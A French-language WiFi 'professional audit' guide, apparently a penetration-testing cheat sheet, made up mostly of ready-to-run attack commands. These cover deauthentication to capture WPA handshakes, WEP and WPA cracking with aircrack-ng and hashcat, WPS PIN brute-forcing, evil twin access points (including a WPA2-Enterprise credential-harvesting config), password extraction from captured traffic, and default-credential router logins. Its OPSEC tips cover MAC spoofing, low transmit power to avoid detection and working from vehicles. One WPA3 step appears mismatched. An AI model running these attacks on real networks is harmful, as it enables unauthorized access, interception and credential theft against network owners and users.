# WiFi Auditing Complet - Guide Professionnel

## 🗂️ Workflow d'audit WiFi
1. Préparation matérielle et configuration interface
   ↓
2. Reconnaissance passive (scanning, OSINT)
   ↓
3. Énumération active des réseaux et clients
   ↓
4. Analyse des protocoles de sécurité (WEP/WPA/WPA2/WPA3)
   ↓
5. Tentatives d'attaque selon le type de sécurité
   ↓
6. Post-exploitation et analyse des données

## 📋 Vue d'ensemble

L'audit WiFi consiste à évaluer la sécurité des réseaux sans fil en testant leurs mécanismes d'authentification, chiffrement et configuration pour identifier les vulnérabilités exploitables.

> **💡 Explication Simple** : C'est comme tester toutes les serrures d'un bâtiment, mais pour les ondes radio. On cherche les portes mal fermées ou les clés faciles à reproduire.

## 🔧 Préparation Matérielle

### Cartes WiFi Compatible Monitor Mode
```bash
# Cartes recommandées pour audit
# - Alfa AWUS036ACS (dual-band, 802.11ac)
# - Alfa AWUS036NHA (2.4GHz, très stable)
# - Panda PAU09 (budget, monitor mode)
# - TP-Link AC600 T2U Plus (dual-band)

# Vérification compatibilité
lsusb | grep -i wireless
iwconfig
```

### Configuration Interface Monitor
```bash
# Identification interface
iwconfig
ip link show

# Arrêt services interférents
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
sudo airmon-ng check kill

# Activation mode monitor
sudo airmon-ng start wlan0
# ou
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Vérification
iwconfig
# Interface devrait être en mode Monitor
```

### Configuration Channels et Bandes
```bash
# Scanner toutes les bandes
sudo iwlist wlan0 freq

# Configuration canal spécifique
sudo iwconfig wlan0 channel 6
# ou avec iw
sudo iw dev wlan0 set channel 6

# Fréquences 2.4GHz (channels 1-14)
# Fréquences 5GHz (channels 36, 40, 44, 48, 149, 153, 157, 161)
```

## 🔍 Reconnaissance Passive

### Scanning des Réseaux
```bash
# Scan basique avec airodump-ng
sudo airodump-ng wlan0

# Scan avec focus 2.4GHz
sudo airodump-ng --band g wlan0

# Scan 5GHz uniquement
sudo airodump-ng --band a wlan0

# Scan et sauvegarde
sudo airodump-ng -w scan_results --output-format csv,cap wlan0

# Scan channel hopping personnalisé
sudo airodump-ng --channel 1,6,11 wlan0
```

### Analyse des Résultats Airodump
```bash
# Lecture fichier CSV généré
cat scan_results-01.csv | grep -v "^$" | head -20

# Extraction réseaux par sécurité
grep "WEP" scan_results-01.csv
grep "WPA2" scan_results-01.csv  
grep "WPA3" scan_results-01.csv

# Tri par signal strength
sort -t',' -k9 -nr scan_results-01.csv | head -10
```

### Reconnaissance OSINT WiFi
```bash
# WiGLE (base de données WiFi mondiale)
# https://wigle.net/
# Recherche par SSID, BSSID, localisation

# Recherche réseaux d'entreprise
curl -s "https://wigle.net/api/v2/network/search" \
  -d "onlymine=false&freenet=false&paynet=false" \
  -d "ssid=CompanyName" \
  -H "Authorization: Basic $(echo -n 'username:password' | base64)"

# Shodan pour points d'accès
shodan search "wifi" country:FR

# Analyse métadonnées images (EXIF GPS)
exiftool *.jpg | grep GPS
```

## 🎯 Énumération Active

### Découverte des Clients
```bash
# Monitor clients connectés
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0

# Probe requests (clients recherchant réseaux)
sudo airodump-ng wlan0 | grep "Probing for"

# Capture probe requests détaillée
sudo tcpdump -i wlan0 -s 0 -w probe_requests.pcap \
  'type mgt subtype probe-req'

# Analyse probe requests
tshark -r probe_requests.pcap -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan_mgt.ssid
```

### Énumération WPS
```bash
# Scan WPS actif
sudo wash -i wlan0

# Information détaillée WPS
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# Test WPS PIN par défaut
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -S -F -B -v 3 wlan0
```

### Fake AP et Evil Twin
```bash
# Création point d'accès légitime
sudo hostapd hostapd.conf

# Configuration hostapd.conf
cat > hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

# DHCP pour clients
sudo dnsmasq -C /dev/null -kd -F 192.168.4.100,192.168.4.200 \
  -i wlan0 --bind-dynamic
```

## ⚔️ Attaques par Type de Sécurité

### Attaques WEP (Déprécié mais encore présent)
```bash
# Capture trafic WEP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0

# Génération de trafic (si réseau inactif)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0  # Association
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0    # ARP replay

# Crack WEP avec aircrack-ng
sudo aircrack-ng wep_capture-01.cap

# Alternative avec besside-ng (automatique)
sudo besside-ng -c 6 wlan0
```

### Attaques WPA/WPA2 PSK
```bash
# Capture du handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0

# Déauthentification pour forcer handshake
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0

# Vérification handshake capturé
sudo aircrack-ng handshake-01.cap

# Crack avec dictionnaire
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Crack avec hashcat (GPU)
sudo aircrack-ng handshake-01.cap -J hashcat_format
hashcat -m 2500 hashcat_format.hccapx rockyou.txt

# Attaque par masque hashcat
hashcat -m 2500 -a 3 handshake.hccapx ?d?d?d?d?d?d?d?d
```

### Attaques WPA2 Enterprise (EAP)
```bash
# Capture certificats et identités
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise wlan0

# Evil Twin pour WPA2 Enterprise
# Configuration hostapd pour EAP
cat > hostapd_eap.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
EOF

# Fichier utilisateurs EAP
cat > hostapd.eap_user << 'EOF'
*     PEAP,TTLS,TLS,FAST
"user"  MSCHAPV2    "password"  [2]
EOF

# Lancement Evil Twin EAP
sudo hostapd hostapd_eap.conf
```

### Attaques WPA3 (Récent)
```bash
# Reconnaissance WPA3
sudo airodump-ng wlan0 | grep SAE

# Attaque Dragonblood (CVE-2019-9494)
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test vulnérabilités WPA3
sudo python3 krack-test-client.py

# Downgrade vers WPA2
# Utilisation d'un evil twin WPA2 avec même SSID
```

## 🔍 Post-Exploitation WiFi

### Analyse du Trafic Capturé
```bash
# Ouverture avec Wireshark
wireshark capture.cap

# Analyse avec tshark
# Filtres utiles:
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08"  # Beacons
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x04"  # Probe requests
tshark -r capture.cap -Y "eapol"                         # Handshakes

# Extraction des handshakes
tshark -r capture.cap -Y "eapol" -w handshakes_only.cap

# Statistiques trafic
tshark -r capture.cap -z conv,wlan -q
```

### Extraction d'Informations Sensibles
```bash
# Recherche de credentials dans trafic
strings capture.cap | grep -i password
strings capture.cap | grep -i login

# Extraction données HTTP
tshark -r capture.cap -Y "http.request" -T fields \
  -e http.host -e http.request.uri

# Recherche données FTP
tshark -r capture.cap -Y "ftp" -T fields \
  -e ftp.request.command -e ftp.request.arg
```

### Persistence et Pivoting
```bash
# Si accès au routeur WiFi
nmap -sS -O router_ip

# Recherche interfaces web d'admin
gobuster dir -u http://router_ip -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Tentatives credentials par défaut
# admin/admin, admin/password, admin/[blank]
curl -u "admin:admin" http://router_ip/admin
```

## 🔧 Outils Spécialisés

### Wifite2 (Automatisation)
```bash
# Installation
sudo apt install wifite

# Scan et attaque automatique
sudo wifite --kill

# Attaque spécifique
sudo wifite -e "TargetSSID" --dict /usr/share/wordlists/rockyou.txt

# WPS seulement
sudo wifite --wps-only

# Sauvegarde résultats
sudo wifite --cracked
```

### Airgeddon (Framework)
```bash
# Installation
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon && sudo bash airgeddon.sh

# Interface interactive avec menu
# Options disponibles:
# - Reconnaissance
# - Attaques WEP/WPA/WPS
# - Evil Twin attacks
# - Enterprise attacks
```

### WiFi-Pumpkin (Evil Twin Framework)
```bash
# Installation
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3 && sudo python3 setup.py install

# Lancement interface
sudo wifipumpkin3

# Configuration Evil Twin
set interface wlan0
set ssid "FreeWiFi"
start
```

### Kismet (Monitoring Avancé)
```bash
# Installation
sudo apt install kismet

# Configuration
sudo kismet

# Interface web: http://localhost:2501

# Configuration kismet.conf
echo "source=wlan0:name=scan" >> /etc/kismet/kismet.conf

# API REST pour intégration
curl http://localhost:2501/devices/views/all.json
```

## 🛡️ Conseils OPSEC
- Utiliser des cartes WiFi dédiées (pas celle du système principal)
- Masquer/changer l'adresse MAC avant les tests actifs
- Limiter la puissance de transmission pour éviter la détection
- Effectuer les tests depuis des véhicules ou positions discrètes
- Documenter tous les réseaux testés avec autorisation écrite

## ⚠️ Erreurs fréquentes
- Oublier de vérifier l'autorisation avant tests actifs
- Utiliser sa propre MAC address (traçable)
- Lancer des attaques trop agressives (détectable)
- Ne pas sauvegarder les captures importantes
- Ignorer les réseaux cachés (SSID broadcast disabled)

## 💡 Astuces
- Utiliser plusieurs cartes WiFi simultanément (monitoring + attaque)
- Combiner reconnaissance passive avec OSINT pour cibler efficacement
- Préparer des wordlists spécifiques au contexte (entreprise, géographie)
- Utiliser les heures de pointe pour capturer plus de handshakes
- Scripter les tâches répétitives (scan automatique, rotation canaux)

## 🔗 Pour aller plus loin
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Wireshark WiFi Analysis](https://wiki.wireshark.org/CaptureSetup/WLAN)
- [Kismet Documentation](https://www.kismetwireless.net/docs/)
- [WiFi Security Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST WiFi Security Guidelines](https://csrc.nist.gov/publications/detail/sp/800-153/final)

## 🧭 Navigation
- [Guide Bluetooth Security](../Bluetooth/Bluetooth-Security-Guide.md)
- [Guide RF Analysis](../RF/RF-Analysis-Complete.md)
- [Retour à Wireless Security](../README.md) 